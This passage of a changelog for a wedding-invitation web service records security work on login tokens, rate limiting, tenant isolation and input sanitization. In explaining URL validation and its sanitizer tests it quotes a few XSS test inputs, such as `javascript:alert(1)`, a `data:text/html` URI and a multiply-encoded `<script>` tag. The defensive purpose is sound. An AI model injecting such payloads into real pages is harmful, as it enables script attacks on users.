- `account_number` is **format-checked, not sanitized** — the promise `P1-16` made when it exempted the field. A character allowlist makes markup unrepresentable, where tag stripping would silently alter a value whose exact characters matter. Whitespace is trimmed rather than rejected, because somebody pasting from their banking app brings it with them.
- Still **not column-encrypted** (ADR-025): encryption would protect only drafts, inside a database holding names, home addresses, venue coordinates and complete guest lists in plaintext beside it.

**Changed** — **ADR-053**: `audit_logs` now records owner actions, not only admin ones, and `docs/DATABASE/10` says so. A separate history table would have been cleaner on paper and worse in an incident — "who changed this gift account, and when" is asked *without knowing in advance* whether an admin or the owner did it, and the answer would have lived in one of two places depending on the answer. The cost is that `admin_id` is now a slightly wrong name.

### 2026-09-12 — events, and a lesson about defence in depth

**Added** — full CRUD over N events per invitation ([P1-12](./records/2026-09-12-P1-12-events-subresource.md))

- `:event_id` is scoped by `:id` **in the query**, both conditions in one statement. `docs/SECURITY/05` § 7's two-step rule: owning the parent is necessary and not sufficient, and a caller who owns invitation A must get a 404 for an event belonging to invitation B.
- `maps_url` is generated from coordinates when left empty, **recomputed when the coordinates change**, and never overwritten when the caller supplied their own. The failure that last point avoids is silent: a venue moves, the link keeps pointing at the old place, and the guest is simply sent somewhere else.
- `display_order` appends, so a new event does not jump to the front of a list the couple ordered on purpose.

**Worth knowing — both mutations passed at first, and the reason generalises.**

Deleting the parent predicate from `findOwnedChild` broke **no test**. Deleting the owner predicate from the event `UPDATE` broke no test either. Each layer's defence was masked by the other: the read returned a row it should not have, and the write then refused it — producing the same 404, for the wrong reason. Every service-level test was green while **neither layer was actually verified**.

Five tests now call the repository directly, where nothing else can cover for a missing predicate, and both mutations fail.

This is the sixth time a test has verified less than its name suggested, and the first time the cause was *defence in depth* rather than a weak assertion. Two correct checks in sequence mean deleting either one changes no observable behaviour from outside — so layered checks, which are supposed to be good, make each other untestable through the front door. **Every remaining sub-resource task needs repository-level tests**, and that warning is on their cards.

**Also found**: `z.string().url()` returns `true` for `javascript:alert(1)`, `JaVaScRiPt:alert(1)` and `data:text/html,...`. `maps_url` becomes an `href` on the public page, so the schema now requires `^https?://` before parsing — measured by running it, not assumed.

### 2026-09-12 — the free tier can publish, once, for three days

**Changed** — a business rule, at the project owner's decision (**ADR-052**, amends BR-1.4, adds BR-2.8).

ADR-023 set the free tier at one unpaid draft and said nothing about whether that draft could be published. It can: **once, for three days.** After that it expires and stops being served, and paying republishes it for the full twelve months.

Three options were put forward — no publishing without payment, a three-day trial that keeps serving with an upgrade banner, and a three-day trial after which the page goes dead. The owner chose the last, which is the hardest on free users and the clearest about the product's value: a guest never sees a half-paid invitation.

**No new status and no new column**, and that is the part worth knowing. The obvious implementation is a `needs_upgrade` boolean beside `status = 'published'`, which is what "give it a flag" suggests. It was rejected because the public renderer would then have to consult **two** fields before deciding a page is visible, and forgetting the second leaves a wedding invitation live forever after its trial ended. A trial publish simply sets `expiry_date` three days out and the existing BR-2.6 expiry sweep does the rest.

**Nothing built so far needed changing.** `P1-09`'s free-draft quota already counts invitations that never reached `paid`, and a trial publish does not reach `paid` — so a user who trials and lets it lapse still holds their one free invitation, can pay to revive it, and cannot start a second one for nothing.

**Worth knowing** — my first draft of BR-2.8 was wrong, and `docs/` caught it. I wrote that a lapsed trial should 404 while a lapsed *paid* invitation showed an "invitation has ended" page. `docs/API/08` already forbids exactly that distinction: the public endpoint answers 404 for anything whose status is not `published`, "WITHOUT leaking the specific reason". The behaviour the owner asked for was already the specified behaviour, and the distinction would have contradicted an explicit instruction to build something nobody needed. The difference is owner-facing only — an upgrade prompt instead of a renewal prompt in the dashboard.

### 2026-09-12 — the couple, and a reference field that is its own tenancy boundary

**Added** — `PATCH /invitations/:id/couple/{groom,bride}` ([P1-11](./records/2026-09-12-P1-11-couple-subresource.md))

- **`photo_media_id` is where this endpoint could leak, and the path parameter does not protect it.** The route's `:id` is checked, so the caller demonstrably owns the invitation — and they can still name **somebody else's** photo, which would then render on their public page. `docs/SECURITY/05` § 6 is about exactly this: a reference field is a second tenancy boundary.
- The check is scoped by **invitation**, not by owner, which is narrower and correct: a photo belonging to a *different invitation of the same user* is still the wrong photo. There is a test for that case on its own.
- It also requires `status = 'ready'`. A file still in the pipeline has not been through `docs/SECURITY/06`'s magic-byte, EXIF and malware stages, so referencing one would put an unvalidated file on a public page the moment processing finished.
- All three rejections return an **identical** error. Distinguishing "not yours" from "does not exist" would let a caller probe which media ids exist, which is the enumeration the 404 rule closes everywhere else; the test compares the serialised errors, not just the status.
- An `UPDATE`, never an upsert — `P1-09` creates both people rows empty, and an upsert could produce a second `groom` under concurrency, which the detail projection would resolve by silently picking whichever row came back first. Three concurrent updates leave one row.
- The role is in the path, as `docs/API/04` writes it, so it cannot be tampered with independently of the resource. An unknown role is a **404**: `/couple/spouse` is not a route, and a 400 would imply it might be.

### 2026-09-12 — one sanitization step, and a guard that refuses to let anyone skip it

**Added** — the free-text sanitization pipeline ([P1-16](./records/2026-09-12-P1-16-sanitization-pipeline.md)), **built out of order** because every sub-resource task from `P1-11` to `P1-15` has it as a definition-of-done item.

- One step between validation and the service, a registry of every free-text field in the product, and `scripts/check-sanitized-fields.mjs` — which **fails the build** when a request schema grows a string field that is in neither the registry nor an exemption list with a written reason. The card's reasoning is the load-bearing part: implemented per-endpoint it gets forgotten on the fifth endpoint; implemented as a step with a registry, forgetting requires deleting something.
- **Validate, then sanitize.** The other order lets a payload change a value's length *after* the length check, so a 3000-character name that shrinks to 90 passes a validation it should have failed. There is a test for the ordering, not just a comment.
- Allowlist throughout, never blacklist — and for almost every field the allowlist is **empty**, which is the strictest form of the rule rather than an exception to it. A guest's name is text; "which tags should a venue address support" has the answer "none".
- 23 payloads, chosen to be the ones that get through allowlist mistakes rather than ten spellings of `<script>`: attribute handlers, `javascript:` and `data:` URIs, SVG, MathML parser confusion, mutation XSS, tab- and newline-separated handlers.

**Worth knowing** — two things the tests caught.

**The sanitizer was storing HTML, not text.** `sanitize-html` strips tags and then *encodes* what remains, so `Budi & Ani` came back as `Budi &amp; Ani`; stored that way, a correct renderer escapes it again and the user sees `Budi &amp; Ani` on their own invitation. Undoing that is not a single decode, because the attacker picks the depth — `&amp;lt;script&amp;gt;` decodes to `&lt;script&gt;` decodes to `<script>`. The sanitizer now strips, decodes and repeats to a fixed point. Caught by a `P1-09` test written for an entirely different reason.

**The exemption reasons were labels, not reasons.** `"as above"`, `"a UUID"`, `"an enum"`, `"HH:MM"` — eleven entries whose justification conveyed nothing anybody could disagree with. A test requiring more than ten characters forced real ones. That list is the cheapest way past a failing build, so it is the half that will be abused, and a reviewer can only push back on a claim that has actually been made.

### 2026-09-12 — you can see, rename and delete your invitations

**Added** — the four core invitation endpoints ([P1-10](./records/2026-09-12-P1-10-invitation-crud.md))

- **The owner filter is in the SQL and there is nowhere else it could be.** `docs/SECURITY/05` § 5 names response-level filtering as the wrong implementation: it works until a `.filter()` is dropped in a refactor, and then it leaks every tenant at once through an endpoint that still looks correct. The list `total` is its own count with the same predicate — an unscoped one would leak the platform's size and make pagination lie.
- **Explicit response projections, never the row.** Returning the row works today and becomes a leak the moment somebody adds a column, because nothing in the code would have to change for it to start being served. The detail and summary key sets are asserted exactly, so a field added or dropped fails a test.
- `PATCH` writes one field. `status`, `owner_id`, `published_at`, `expiry_date` and `template_version_id` are not parameters anywhere in the chain — status moves only through the status service, which a build guard enforces.
- Soft delete keeps the row and **frees the slug** (ADR-033), which the response says out loud, since that is the part a user is most likely to be surprised by in either direction.

**Worth knowing** — the first mutation aimed at the update whitelist **passed**. Making the repository spread its argument changed nothing, because the _service_ builds `{ internalName }` explicitly before calling it. The whitelist is at the service and the repository's narrow type is the second layer; mutating both at once fails five tests, which is the honest statement of where the defence lives.

### 2026-09-12 — you can create an invitation

**Added** — `POST /invitations` ([P1-09](./records/2026-09-12-P1-09-create-invitation.md))

- One transaction, five rows: the invitation, its settings, its quote and **both** people rows — empty rather than absent, so every later edit is a simple update instead of an upsert racing another tab.
- **BR-3.1 is enforced where it can only be enforced once.** The invitation locks a concrete `template_version_id` at creation. An admin editing a template must not change the appearance of an invitation already sent to three hundred guests, and resolving the version at read time _is_ the bug that rule was written to prevent.
- **The free-draft quota counts what has never been paid, not what is a draft.** BR-1.4 limits unpaid inventory, not customers, so a wedding organiser with five paid invitations can still start a sixth.
- Slug validation covers format, the reserved/profanity blocklist and global uniqueness, with `409 SLUG_TAKEN` kept distinct from the 400s. **Uppercase is rejected rather than normalised**: a URL path is case-sensitive, and silently storing `budi-dan-ani` for somebody who typed `Budi-Dan-Ani` hands them an address that does not resolve, possibly after they have printed it.

**Added** — the `slug_blocklist` table (migration `0006`) and its seed. `docs/DATABASE/12` specifies it and `P5-13` was to build it, but a slug validation that reads an empty table accepts `admin`, `api` and `www` — and `docs/PLAN/10` § 2 makes every path segment on the public host a reserved slug, because invitations sit at its root and an unreserved route could take a wedding page offline silently.

**Worth knowing** — two bugs that would have shipped silently.

`enabled_sections` was empty on **every** new invitation: the reader looked for `section.key` and the schema's field is `section_key`. That renders as a blank invitation rather than an error, so nothing would have failed until somebody opened one.

And the free-draft quota's mutation **passed**. Replacing "never paid" with `status = 'draft'` broke nothing, because every test used a `paid` invitation — which is not a draft either way. The case that distinguishes them is `pending_payment`: never paid, not a draft, and therefore still unpaid inventory. A quota written the short way would have let a user park one there and start another. Fifth time in this project a test has verified less than its name suggested, and the fifth time only the mutation found it.

### 2026-09-12 — your own account, and what happens when you delete it

**Added** — the six endpoints of `docs/API/02` ([P1-08](./records/2026-09-12-P1-08-user-profile-and-deletion.md))

- **IDOR prevention by design, taken literally.** Every path is `/users/me` and every service method takes a tenant scope derived from the authenticated row. There is no route with a parameter and no method with a user id, so the attack this section is about has nowhere to travel — it is not rejected, it cannot be expressed.
- Mass assignment is blocked twice and the two fail differently: the schemas are `.strict()`, so a request carrying `role` is **rejected** rather than silently stripped, and below that the service builds its patch field by field so a future edit cannot spread a validated object into an update. Eight forbidden fields each have a test.
- A password change revokes other sessions in the same transaction as the write, and **spares the session that made it** — the difference from a reset is that the user is here and authenticated.

**Decided** — **ADR-051**, answering `OQ-11`: **deleting an account does not take its published invitations down.** The account is soft-deleted and every session revoked immediately; published invitations keep serving until their own expiry, and everything is hard-deleted together under BR-9.

The case against an immediate takedown is concrete rather than theoretical. A couple has sent the link to three hundred guests who use it for the address, the time and the RSVP. Honouring a deletion request by breaking that removes data **the requester published on purpose, about themselves**, and lands the harm on people who did not ask for anything. The account still dies at once, so somebody deleting because they fear compromise gets what they need; the invitation outlives the login rather than the other way round. The API response says `live_invitations` and names the behaviour, because a user who finds their wedding page still up should have been told that was the intent.

This remains a legal question as much as a product one. If counsel disagrees, one test needs inverting and it is named in the ADR.

**Worth knowing** — `docs/API/02` says `phone` is "validated in BACKEND/03-VALIDATION.md", and `docs/BACKEND/03` contains no phone rule at all. The format implemented is this task's choice, marked as such where it is defined rather than quietly presented as a transcription.

### 2026-09-12 — rate limiting, and a decision about Redis being down

**Added** — the policy table from `docs/SECURITY/10`, enforced ([P1-07](./records/2026-09-12-P1-07-rate-limiting.md))
- A **sliding** window in Redis, not a fixed one. A fixed window resets on a clock boundary, so an attacker spends the whole allowance at the end of one window and again at the start of the next — ten attempts in two seconds against a limit of "5 per 15 minutes".
- Trim, count and add are one Lua script, so two concurrent requests cannot both take the last slot.
- Login counts **failed** attempts only, as the document specifies. Counting successes would lock out a household sharing an address, and would let an attacker exhaust a victim's budget by logging in correctly.
- Limits are tunable **without a deploy**: `HSET rl:config login '{"limit":20}'` is in force within thirty seconds. A malformed override is logged and ignored rather than applied — a typo during a tuning change must not remove a control at the moment somebody is distracted by traffic.
- `X-RateLimit-Limit`, `-Remaining` and `-Reset` on **every** response, not only refusals: a client can only back off before hitting a wall if it can see the wall coming.
- The payment webhook is exempt (`docs/SECURITY/02` boundary 5) — a provider retry storm is legitimate traffic, and throttling it into failure loses the notification that `docs/SECURITY/07` makes the only source of truth for payment status.

**Decided** — **ADR-050**: when Redis is unreachable, credential endpoints **fail closed** (`503`) and everything else **fails open**. Unlimited credential attempts against a live user table is a credential-stuffing window that opens exactly when the operator is distracted; a login outage is merely an outage. `503` rather than `429`, because "slow down" would be false and a backoff client would wait for the wrong thing. The cost, stated plainly: a Redis outage takes login, registration and password reset down completely.

**Worth knowing** — **the first version did not limit anything.** The decision was derived in TypeScript from the count the Lua script returned, and at the limit a count is ambiguous: it means both "this one just filled the last slot" and "this one was turned away". `count > limit` was therefore never true. The headers were correct and `remaining` counted down, so a manual test would have shown a limiter working right up until the moment it was supposed to refuse. Six tests caught it on the first run.

**Raised** — `OQ-22`: the (email, IP) key that `docs/SECURITY/10` specifies gives a distributed attacker a fresh budget per IP. The obvious tightening — a per-email limit — would let a stranger lock a victim out of their own account by failing five logins.

### 2026-09-12 — the authorization trio, and the test that makes the rest cheap

**Added** — `requireAuth`, `requireRole`, `requireOwnership` ([P1-06](./records/2026-09-12-P1-06-auth-role-and-ownership-middleware.md))
- **`requireOwnership` is a service-layer function, not a guard.** `docs/SECURITY/04` lists all three names together under "Mandatory Middleware", but its own Implementation Principle 2 says ownership is checked in the service "so no code path can accidentally bypass it when the service is called from elsewhere (e.g., from a job/worker)". A Nest guard runs on an HTTP request and nothing else; making this one a guard would have satisfied the heading and broken the principle **invisibly**, because the endpoint would still be safe and the worker calling the same service would not be.
- It takes a loader rather than a resource, which is the document's own signature and what keeps the owner filter in the SQL. Because the loader already carries `WHERE owner_id = :scope`, the function never sees a row it has to judge — it only turns `null` into a 404, so it cannot judge one wrongly.
- The current user lives under a **symbol**, not `req.user`: that name is a shared namespace half the Express ecosystem writes to, and anything setting it would silently become an authentication source.

**Added** — the reusable IDOR assertion, `test/support/idor.ts`, and `backend/api/test/README.md`
- `docs/SECURITY/04` makes "User B cannot access User A's resource" a DoD item for **every** `:id` endpoint, and dozens are coming. A mandatory test that is tedious to write is one somebody eventually writes badly, so the honest version now costs one line.
- It refuses a service that leaks, one that answers **403** instead of 404 (which confirms the resource exists), one that answers 404 with the resource still in the body, and — the half people forget — **one that refuses everybody**, which passes every IDOR test ever written and ships a broken product.
- **Three of its own tests pass only when an assertion fails.** A helper that cannot fail proves nothing, and every later endpoint's mandatory test inherits whatever this one is worth.

**Worth knowing** — removing the `owner_id` predicate from `findOwned` fails seven tests, including the helper's own. That mutation is the closest thing this project has to a regression alarm on its highest-priority security rule.

### 2026-09-12 — a reset that actually takes the account back

**Added** — forgot and reset password ([P1-05](./records/2026-09-12-P1-05-forgot-and-reset-password.md))
- **Every session on the account ends, in the same transaction as the password write.** `docs/SECURITY/03` asks for this with an explicit reason — "in case the account was already compromised previously" — and that reason is the whole design: the resets that matter are somebody taking their account back from a person holding a thirty-day refresh token. A crash between the two writes would leave a new password and the attacker's session both working, and the user would see nothing wrong.
- One-hour, single-use, hashed token. Asking twice leaves only the newer link live, and a spent token is indistinguishable from one that never existed — "already used" would confirm it had once been real.
- An unknown address is indistinguishable from a known one in body **and** in timing: the unknown path runs the same transaction against a nil UUID rather than returning early. That claim is bounded rather than absolute, and the code says so.
- The account owner gets a "your password was changed" notification, because they are the only person who can say it was not them.
- An account created through Google, which has no password, can set one through this flow.

**Worth knowing** — step 4 of the card (rate limit 3/hour per email and IP) is **not** implemented here and is not one of this card's DoD items. `P1-07` owns rate limiting; a second implementation would be a second thing to keep in step. Recorded as an obligation on that card.

### 2026-09-12 — sign in with Google

**Added** — `POST /auth/oauth/google` ([P1-04](./records/2026-09-12-P1-04-google-oauth.md))
- **The request body has one field, so there is no email to trust.** `docs/SECURITY/03`'s instruction — "NEVER trust the email from the request body" — is usually implemented as discipline. Here the schema is `{ id_token }`, Zod strips everything else, and the service takes a single opaque string: the attack has no way to be expressed. Two tests send a mismatched address and watch it have no effect.
- **The audience is checked**, which is the check people skip: a token minted for a *different* Google application is validly signed and carries a real verified email, so without it any site using Google Sign-In could hand us its users' tokens.
- **An unverified Google address can neither claim an existing account nor create one.** A Workspace administrator can mint an identity on an address they do not own; linking one would be account takeover without a password, and registering one would create an account whose password reset belongs to somebody else.
- Google being unreachable is a `503`, not a `401`. A user whose sign-in failed because a key endpoint was slow has done nothing wrong and may have no password to fall back on.
- A Google account links to an existing password account without removing the password, so both sign-in methods keep working.

**Changed** — `idx_users_oauth` is now **unique** over active accounts (ADR-049, migration `0005`), which answers `OQ-15`. The task card makes `(oauth_provider, oauth_subject_id)` the first thing a sign-in matches on, turning it from a lookup key into a login key — and a login key that can match two rows is a login whose outcome depends on row order. `docs/DATABASE/02` was updated to match.

**Worth knowing** — the first version of the verifier **leaked the `id_token` into the log stream**. `google-auth-library` throws `new Error('Invalid token signature: ' + jwt)`, with the whole token in the message, and three of its other messages embed the decoded payload including the user's email; that message was being stored as the error's `reason`, which is logged on every failed sign-in. `P0-12`'s redaction could not have caught it — redaction matches key names, and the credential would have arrived inside a string called `reason`. The classifier now maps each message to a fixed slug and discards the text.

### 2026-09-12 — you can log in, and be logged out everywhere

**Added** — login, access tokens and rotating refresh tokens ([P1-03](./records/2026-09-12-P1-03-login-tokens-and-refresh-rotation.md))
- **A stolen session ends the next time either party uses it.** Refresh tokens rotate on every use, and presenting one that has already been spent is treated as theft: every session that user has is revoked, including devices the attacker never touched, and `auth.token_reuse_detected` goes to the one-year retention stream. `docs/SECURITY/03` calls for exactly this and the task card calls it the highest-value behaviour in the task; it is proven by two named tests and by the mutation that makes them fail.
- **A suspension takes effect immediately, not in fifteen minutes.** The access token proves *who* you are; `role`, `status` and `email_verified` are re-read from the database on every authenticated request, so a validly-signed token claiming `role: super_admin` resolves to whatever the row says. `docs/SECURITY/01` § Elevation of Privilege.
- The refresh token leaves only as an `HttpOnly; Secure; SameSite=Lax` cookie scoped to `/api/v1/auth`, never in a response body, and a token supplied in the body is ignored. Three tests read the raw `Set-Cookie` header, because that is the only place those attributes exist.
- An unknown email and a wrong password produce the same code, the same message **and** comparable timing. A suspended account with the correct password gets a distinct `403`, which is not an enumeration oracle: only someone who already has the password reaches it.
- JWTs are signed and verified by `jose` with HS256 pinned (ADR-046) — `alg: none`, algorithm substitution, a wrong key and a tampered payload each have a test.

**Changed** — `JWT_SIGNING_KEY` and `REFRESH_TOKEN_PEPPER` are now **required, at 32 characters, in every environment** (ADR-047). The old rule applied a length floor in production only; a short HMAC key is brute-forceable offline wherever it runs, and development is where short keys come from. **Staging will refuse to boot until both are generated on the host** — `openssl rand -base64 48`, twice, into the mode-600 `.env`.

**Worth knowing** — two legitimate concurrent refreshes (two browser tabs, or a retried request) are indistinguishable from theft and will log the user out everywhere. That follows `docs/SECURITY/03` literally. Raised as `OQ-21` rather than quietly softened, because a grace window weakens a control the document states without qualification.

### 2026-09-11 — you can create an account

**Added** — registration, email verification and resend ([P1-02](./records/2026-09-11-P1-02-registration-and-verification.md))
- **`POST /auth/register` cannot be used to find out who has an account.** A duplicate address returns the same `201` and the same body as a new one, and takes the same time: the password policy runs and the argon2 hash is computed *before* the existence check, so the 277 ms from `P1-01` lands on both paths. The real owner still gets an email saying somebody tried — otherwise they are the only person the defence keeps in the dark.
- **A verification token is single-use because of the `UPDATE`, not because of a read.** One conditional `UPDATE … WHERE used_at IS NULL` decides the winner, so a mail client prefetching the link while the user clicks races in the database rather than in application code. Issuing a token revokes the previous unused one, so "resend" does not leave a trail of live links.
- Tokens are 256 bits stored as SHA-256; a database dump does not yield a working link. Twenty-four-hour expiry per `docs/SECURITY/03`.
- Registration survives the queue being down — the notification job is enqueued after the transaction commits and its failure is logged, not propagated.
- The API gained a **queue producer** (`P0-15` built the consumer), and `REDIS_URL` is now actually declared in the environment schema instead of only being named in a comment.

**Worth knowing** — the unverified-user gate exists and is tested, but the DoD asks for tests on `POST /publish` and `POST /orders`, and neither endpoint exists yet. Recorded as an obligation on `P3-06` and `P3-01` rather than ticked.

### 2026-09-11 — Phase 1 begins: passwords

**Added** — hashing, verification and policy ([P1-01](./records/2026-09-11-P1-01-password-hashing.md))
- **argon2id at 64 MiB, t=3, p=1**, measured on the actual deployment host across a grid rather than copied from a recommendation (ADR-045). 277 ms per hash — over three times OWASP's floor on memory, which is the dimension that makes argon2 expensive to attack.
- **Verification costs the same whether the account exists or not.** `docs/SECURITY/03` requires the response not to distinguish an unregistered email from a wrong password, and that is a claim about time, not just about the message. A missing hash is verified against a dummy built from the current parameters, so its cost cannot drift away from the real one.
- **The breached-password check fails open and says so** (ADR-044). `docs/SECURITY/03` calls it *recommended*; failing closed would block a couple registering during someone else's outage. It reports "unavailable" as a value distinct from "safe" and emits a security event — a control that can be down unnoticed is not a control.
- Only the first five characters of the password's SHA-1 ever leave the process, and a test asserts the request contains neither the password nor the rest of the hash.

**Worth knowing** — a mutation disproved a claim written in the feature spec. The `null` guard in `verifyPassword` is a **timing** control, not a correctness one: delete it and the test named "a null hash never verifies" still passes, because argon2 throws and the catch returns false anyway. Only the timing tests catch it. Third time in this project a test has verified less than its name suggested, and third time only running the mutation found it.

### 2026-09-11 — it runs somewhere other than a laptop

**Added** — a staging environment ([P0-23, partial](./records/2026-09-11-P0-23-staging-deploy.md))
- Ten services on the project owner's VM: PostgreSQL 18, Redis, MinIO, the API, three worker pools and all three frontends. Migrated with a separate `migrate` image — the runtime image cannot run migrations, and the thing that can alter the schema should not be the thing serving traffic — and seeded with the reference template and demo invitation.
- The three frontends gained Dockerfiles; both Next apps build to standalone output, and admin's runtime is nginx with no Node in it at all.
- Secrets are generated on the host and live in a git-ignored `.env` at mode 600. None has been typed anywhere else.

**Changed** — the domain is `vizunicum.my.id` (ADR-042). `zedth.my.id` is gone from everything except `MEMORY/`, which keeps it because it was true when written. ADR-024 keeps its text and gains a forward pointer.

**Changed** — **`APP_ENV` is now separate from `NODE_ENV`** (ADR-043). `docs/DEVOPS/00` defines four environments; `NODE_ENV` has three values and belongs to Node and the bundlers. Staging must run a production *build* to satisfy parity while being a non-production *environment* with sandbox credentials and seed data. The visible symptom was `db:seed` refusing to run on the one deployed environment that is required to be seeded. The quiet one was worse: **a live payment key on staging would have passed the one check `secret-rules.ts` exists for.**

**Live** — `https://app.vizunicum.my.id` and `https://invitation.vizunicum.my.id/{slug}`, over a Cloudflare Tunnel. The host has a private address and therefore no inbound port and no certificate of its own; `cloudflared` dials out and Cloudflare terminates TLS at its edge. Two CNAMEs, no wildcard anywhere.

Verified from the public internet rather than from localhost: the slug reaches the handler, the application and invitation hosts do not cross, and the full `P0-22` workbench accessibility suite — 11 tests including per-story colour contrast — passes against the live URL.

Automated deployment was **waived by the project owner** on 2026-09-11 — deploying is `git pull` plus a compose command. The waiver covers deployment only: lint, dependency auditing and SAST still run nowhere, which is the one Phase 0 exit criterion left unmet and the reason `P0-17` stays on the board.

### 2026-09-11 — the product has a face

**Added** — three applications and one design system ([P0-22](./records/2026-09-11-P0-22-frontend-skeletons-design-system.md))
- **`packages/ui`** — the tokens from `docs/UI-UX/06`–`09` as a single Tailwind v4 `@theme` block, so the utility class, the CSS variable and the declared value cannot disagree; plus the thirteen core components with every state `docs/UI-UX/06` lists.
- **`packages/api-client`** — the centralised interceptor from `docs/FRONTEND/08`, and an access token that lives in a closure variable with no persistent branch to configure wrongly. Six concurrent 401s share one refresh, because a rotating refresh token would treat the other five as theft.
- **`web-app`**, **`public-invite`** (server-rendered `/[slug]`, as `docs/FRONTEND/07` requires) and **`admin`** (a separate Vite app on its own trust boundary, `docs/SECURITY/02`).
- **A component workbench** at `/workbench`, audited by axe in a real browser, per component — not Storybook, so it audits what actually ships (ADR-041).

**Fixed before anyone saw them** — three token choices failed WCAG AA on the first run of the contrast test. The worst was the control border at **1.48:1** on white, which is the most common accessibility defect in modern form design and a WCAG 2.1 § 1.4.11 failure. `--color-border` and `--color-border-strong` exist as two tokens because of it.

**Worth knowing** — the browser pass caught a contrast failure at **4.49:1** that neither the jsdom axe pass nor the arithmetic token test could see: `opacity` on a disabled state blends to a colour nobody declared and no test can check. Disabled states now use chosen colours.

**Blocked** — `P0-23` (staging, hosts, TLS) is marked BLOCKED rather than TODO. It needs a provisioned VPS, DNS control for `zedth.my.id` and Cloudflare credentials; its whole point is proving TLS and host routing against the real hostnames, and a simulation would report green while proving nothing.

### 2026-09-10 — the product has a template

**Added** — Elegant Rose v1.0.0 and its demo ([P0-21](./records/2026-09-10-P0-21-reference-template-and-demo.md))
- **The template is a JSON file**, not a module. `docs/PLAN/07` § Core Principles forbids per-template code, and a template in a `.ts` file is one that *could* import something — the first that did would break the rule for every template after it. Ten sections in the `docs/UI-UX/14` order; hero and event non-configurable; gift off by default, because asking for money is a choice a couple makes deliberately.
- **The demo is a real invitation**, owned by a system account that cannot be logged into (no password hash, no OAuth provider, an address under RFC 2606's reserved `.invalid`). `docs/PLAN/07` § Demo Data chose this over a fixture format so the catalogue renders through the production renderer reading the production public API shape, with no second code path to drift.
- **A test proves the demo is publishable against its own template** — `collectMissingRequiredFields` returns nothing, checked once against the seed files and once against the rows the seed wrote. A catalogue demo with a hole in it fails on the one page whose job is setting expectations.
- `pnpm --filter @wi/api db:seed` installs both, idempotently — running it twice is asserted to leave the same rows, because `docs/PLAN/07` says the demo is "refreshed by the same seed command".

**Known and written down**: the gallery *rows* are seeded and the image *bytes* are not. The demo page shows broken images until the upload pipeline (`P1-16`) fills them.

### 2026-09-10 — templates become machine-checkable

**Added** — `@wi/schema` stops being a placeholder ([P0-20](./records/2026-09-10-P0-20-template-schema-and-resolver.md))
- **39 canonical field paths** from `docs/PLAN/08`, one enumerated registry. A template asking for `couple.groom.nickmame` is now rejected at authoring time, naming the path and suggesting the near miss. Before this it was valid JSON that stored cleanly in a JSONB column and rendered an empty hero on every invitation using the template — forever, because BR-3.1 locks a version.
- **A component registry where each name is bound to the one section it renders.** `{ section_key: "gallery", component: "HeroClassic" }` passes any name-only check and puts a hero where the gallery belongs. The registry is append-only, which is R5 in `docs/PLAN/18` written as a rule rather than a risk.
- **One dot-notation resolver** for publish validation (`docs/BACKEND/03`) and the renderer (`docs/FRONTEND/04`), with a single definition of "empty". `0` and `false` are **not** empty — `order: 0` and `is_cover: false` are legitimate values that `!value` reports as missing. A wildcard path is missing when *any* element is empty: two events where one has no date is not a publishable invitation.
- **A build guard** so `docs/DATABASE/03`'s "validated before being saved" survives into Phase 5. The columns are JSONB; Postgres will accept anything at all.

**Raised** — **OQ-20**: `docs/PLAN/07` gives one example value each for `border_radius` and `typography.scale` and no vocabulary. Enumerated provisionally (ADR-038) rather than accepting any string, because an unknown CSS token renders as nothing rather than as an error.

**Fixed** — the test factory had been writing template versions nothing could render: a CSS custom property where the theme belongs, and a section missing `configurable`. Harmless only while nothing read the column.

### 2026-09-10 — the worker finally redacts

**Changed** — one logging package for both surfaces ([P0-19.1](./records/2026-09-10-P0-19.1-shared-logging.md))
- `@wi/logging` owns redaction, request correlation and job trace. The API and the worker keep four lines each: their service name, and a call to `createLogger`.
- **The worker redacts for the first time.** `P0-15` shipped it with a logger carrying the comment "NOTE: this does NOT redact", and `docs/DEVOPS/06` § Mandatory Redaction is explicit that this must not "rely on manual developer discipline each time". The comment was honest, accurate, and changed nothing for four tasks.
- So the comment is replaced by a mechanism: `scripts/check-logger-construction.mjs` refuses a `pino()` call outside the package, blocking in `verify.sh` and on push. A logger built directly from pino writes secrets in clear text and looks identical in every other respect — same fields, same level, same stream.

**Fixed** — two things that only fail in a build:
- `backend/worker/Dockerfile` built **no workspace dependencies at all** — `--filter @wi/worker` without the trailing dots. Latent since `P0-15` because the worker had no type-level workspace import; the first one failed the image build outright.
- `backend/api/Dockerfile`'s hand-maintained list of workspace manifests is gone. `P0-19` found it two members stale and predicted it would go stale again; this task would have been the third entry. `pnpm fetch` now keys the dependency layer on the lockfile alone, which reads no `package.json` at all.

**Worth knowing** — the test suite inherited from `P0-12` **could not have caught redaction being deleted**. It built its own pino instance with a copy of the formatters, so nothing in it called the real factory. Removing `redact()` left all 39 assertions passing. Measured, then closed.

### 2026-09-10 — the test harness, and the two bugs it found immediately

**Added** — all four test layers ([P0-19](./records/2026-09-10-P0-19-test-harness.md))
- An integration harness that prefers a database you already have and falls back to a container, applies every migration automatically, and **fails rather than skips** when nothing is reachable — verified, exit code 1.
- Factories, and `createTwoTenants()` above all. `docs/SECURITY/05` requires an IDOR test for every `:id` endpoint; what decides whether those get written is whether the setup is one line or twenty. The parties are named `alice` and `mallory` so a test states the attack in its own arguments.
- E2E over real HTTP, and an accessibility suite with a **negative control** — a deliberately broken fixture, violations named rather than counted. An axe suite that only ever sees a correct page reports zero violations whether it is working or doing nothing at all.
- Provider mocks that **abort by default**: any third-party call not explicitly routed is refused, so a test cannot quietly reach a real provider.

**Fixed** — two bugs that only exist in the built artefact, which is why nothing had caught them:

- **The API crashed on startup in the container.** `pino-pretty` is a devDependency stripped by `pnpm deploy --prod`, while compose runs that image with `NODE_ENV=development`. The logger keyed its transport on `NODE_ENV`, tried to load a missing module, and pino threw during initialisation — the process exited before serving a request. Present since `P0-12`. It now asks whether `pino-pretty` resolves, and falls back to structured JSON, which is what production wants anyway.
- **`backend/api/Dockerfile` was two workspace members stale.** It lists each member's `package.json` by hand for layer caching, and `packages/storage` and `e2e` were never added. The image built without error and served whatever the cache last produced; E2E found it by requesting `/readyz` — a route present since `P0-13` — and getting a 404.

### 2026-09-10 — a configuration that refuses to mix environments

**Added** — secrets and configuration conventions ([P0-18](./records/2026-09-10-P0-18-secrets-config.md), ADR-034)
- **The service refuses to start when the configuration mixes environments.** A live Midtrans key outside production is a valid string of the right shape and length — every per-field check passes it — and a staging test with it would charge a real card. Only a rule reading two values at once can tell.
- **The reverse is enforced too, and is easier to miss**: a sandbox key in production means every payment succeeds against the provider's test environment, no money arrives, and the orders look paid. Nothing errors, so nothing alerts.
